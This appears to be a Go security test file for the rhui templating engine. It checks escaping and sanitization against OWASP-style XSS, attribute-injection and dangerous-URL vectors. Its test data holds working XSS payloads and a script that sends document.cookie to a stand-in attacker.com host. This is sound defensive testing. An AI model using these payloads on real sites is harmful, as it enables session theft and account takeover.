package tests

import (
	"strings"
	"testing"

	"github.com/suserc0de/rhui"
	"github.com/suserc0de/rhui/runtime"
)

// TestOWASP_XSS_Vectors verifies defense against standard OWASP XSS attack vectors
// by ensuring that dangerous HTML tags are escaped and cannot be executed as HTML elements.
func TestOWASP_XSS_Vectors(t *testing.T) {
	vectors := []struct {
		name       string
		input      string
		disallowed []string
	}{
		{
			name:       "Script Tag Injection",
			input:      `<script>alert('xss')</script>`,
			disallowed: []string{"<script>", "</script>"},
		},
		{
			name:       "Img Onerror Attribute",
			input:      `"><img src=x onerror=alert(1)>`,
			disallowed: []string{"<img", ">"},
		},
		{
			name:       "SVG Onload Execution",
			input:      `<svg/onload=alert('svg')>`,
			disallowed: []string{"<svg", ">"},
		},
		{
			name:       "Iframe Source",
			input:      `<iframe src="javascript:alert(1)"></iframe>`,
			disallowed: []string{"<iframe", ">"},
		},
		{
			name:       "Body Tag Event Handlers",
			input:      `<body onload=alert('pwn')>`,
			disallowed: []string{"<body", ">"},
		},
		{
			name:       "Nested Broken HTML Tag Vectors",
			input:      `<<SCRIPT>alert("XSS");//<</SCRIPT>`,
			disallowed: []string{"<SCRIPT>", "</SCRIPT>"},
		},
	}

	for _, tc := range vectors {
		t.Run(tc.name, func(t *testing.T) {
			escaped := runtime.EscapeHTML(tc.input)
			for _, bad := range tc.disallowed {
				if strings.Contains(escaped, bad) {
					t.Fatalf("Vector %q failed: output %q still contains unescaped %q", tc.name, escaped, bad)
				}
			}
		})
	}
}

// TestOWASP_AttributeInjection verifies escaping inside quoted HTML attributes
func TestOWASP_AttributeInjection(t *testing.T) {
	vectors := []struct {
		name  string
		input string
	}{
		{name: "Quote breakout with onclick", input: `" onclick="alert('pwn')"`},
		{name: "Single quote breakout", input: `' onfocus='alert(1)'`},
		{name: "Angle bracket breakout", input: `"><b>injected</b><"`},
	}

	for _, tc := range vectors {
		t.Run(tc.name, func(t *testing.T) {
			escaped := runtime.EscapeAttribute(tc.input)
			if strings.Contains(escaped, `"`) || strings.Contains(escaped, `<`) || strings.Contains(escaped, `>`) {
				t.Fatalf("Attribute escaping failed for %q, got: %q", tc.name, escaped)
			}
		})
	}
}

// TestOWASP_URLSanitization verifies defense against pseudo-protocol javascript: and vbscript: attacks
func TestOWASP_URLSanitization(t *testing.T) {
	urls := []struct {
		input  string
		isSafe bool
	}{
		{input: "https://example.com/profile", isSafe: true},
		{input: "http://example.com/test?a=1&b=2", isSafe: true},
		{input: "/dashboard/metrics", isSafe: true},
		{input: "./avatar.png", isSafe: true},
		{input: "../common/style.css", isSafe: true},
		{input: "#section-heading", isSafe: true},
		{input: "?page=2", isSafe: true},
		{input: "mailto:support@rhui.dev", isSafe: true},
		{input: "tel:+123456789", isSafe: true},
		{input: "profile/avatar.png", isSafe: true},
		{input: "javascript:alert(1)", isSafe: false},
		{input: "JAVASCRIPT:alert(document.domain)", isSafe: false},
		{input: "  javascript:evil()", isSafe: false},
		{input: "vbscript:msgbox(1)", isSafe: false},
		{input: "data:text/html,<script>alert(1)</script>", isSafe: false},
		{input: "data:text/javascript,alert(1)", isSafe: false},
		{input: "data:image/svg+xml;base64,PHN2Z...", isSafe: false},
		{input: "blob:https://example.com/uuid", isSafe: false},
		{input: "file:///etc/passwd", isSafe: false},
		{input: "//evil.com/phishing", isSafe: false},
		{input: "java\x00script:alert(1)", isSafe: false},
		{input: "java\tscript:alert(1)", isSafe: false},
		{input: "java\nscript:alert(1)", isSafe: false},
		{input: "java\rscript:alert(1)", isSafe: false},
	}

	for _, u := range urls {
		sanitized := runtime.SanitizeURL(u.input)
		if !u.isSafe {
			if strings.HasPrefix(strings.ToLower(sanitized), "javascript:") ||
				strings.HasPrefix(strings.ToLower(sanitized), "vbscript:") ||
				strings.HasPrefix(strings.ToLower(sanitized), "data:") ||
				strings.HasPrefix(strings.ToLower(sanitized), "blob:") ||
				strings.HasPrefix(strings.ToLower(sanitized), "file:") ||
				strings.HasPrefix(sanitized, "//") {
				t.Fatalf("Dangerous URL scheme allowed through: %s (input: %q)", sanitized, u.input)
			}
			if sanitized != "#unsafe-url" {
				t.Fatalf("Expected #unsafe-url for dangerous input %q, got: %q", u.input, sanitized)
			}
		} else {
			if sanitized == "#unsafe-url" {
				t.Fatalf("Safe URL incorrectly flagged as unsafe: %q", u.input)
			}
		}
	}
}

// TestDynamicAttributeValidation ensures malicious attribute keys cannot perform injection
func TestDynamicAttributeValidation(t *testing.T) {
	engine, err := rhui.New()
	if err != nil {
		t.Fatalf("failed to create engine: %v", err)
	}

	tmpl := `<button :attrs="Attrs">Click</button>`
	if err := engine.ParseTemplate("button_test", tmpl); err != nil {
		t.Fatalf("ParseTemplate failed: %v", err)
	}

	dangerousAttrs := map[string]any{
		`valid-id`:                  "my-button",
		`data-info`:                 "safe",
		`onclick`:                   "alert('pwn')",
		`ONCLICK`:                   "alert('pwn2')",
		`onerror`:                   "steal()",
		`onload`:                    "evil()",
		`onfocus`:                   "focusEvil()",
		`onmouseover`:               "hoverEvil()",
		`foo" onmouseover="alert(1)`: "injected",
		`test'onclick='evil()`:      "injected2",
		`bad attribute name`:        "injected3",
		`invalid/slash`:             "injected4",
		`invalid>tag`:               "injected5",
	}

	out, err := engine.RenderString("button_test", map[string]any{
		"Attrs": dangerousAttrs,
	})
	if err != nil {
		t.Fatalf("RenderString failed: %v", err)
	}

	if strings.Contains(out, "onmouseover") || strings.Contains(out, "onclick") || strings.Contains(out, "alert") || strings.Contains(out, "onerror") || strings.Contains(out, "onload") || strings.Contains(out, "onfocus") {
		t.Fatalf("Attribute or event handler injection successful! Output: %s", out)
	}
	if !strings.Contains(out, `valid-id="my-button"`) || !strings.Contains(out, `data-info="safe"`) {
		t.Fatalf("Expected valid attributes to be preserved, got: %s", out)
	}
}

// TestEndToEnd_XSSSanitization tests engine rendering with malicious user input
func TestEndToEnd_XSSSanitization(t *testing.T) {
	engine, err := rhui.New()
	if err != nil {
		t.Fatalf("failed to create engine: %v", err)
	}

	tmpl := `<div>Welcome {{ UserInput }}</div>`
	if err := engine.ParseTemplate("pages/xss_test", tmpl); err != nil {
		t.Fatalf("ParseTemplate failed: %v", err)
	}

	maliciousInput := `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
	out, err := engine.RenderString("pages/xss_test", map[string]any{
		"UserInput": maliciousInput,
	})
	if err != nil {
		t.Fatalf("RenderString failed: %v", err)
	}

	if strings.Contains(out, "<script>") {
		t.Fatalf("Vulnerability detected! Unescaped script tag found in: %s", out)
	}
	if !strings.Contains(out, "&lt;script&gt;") {
		t.Fatalf("Expected escaped entities, got: %s", out)
	}
}
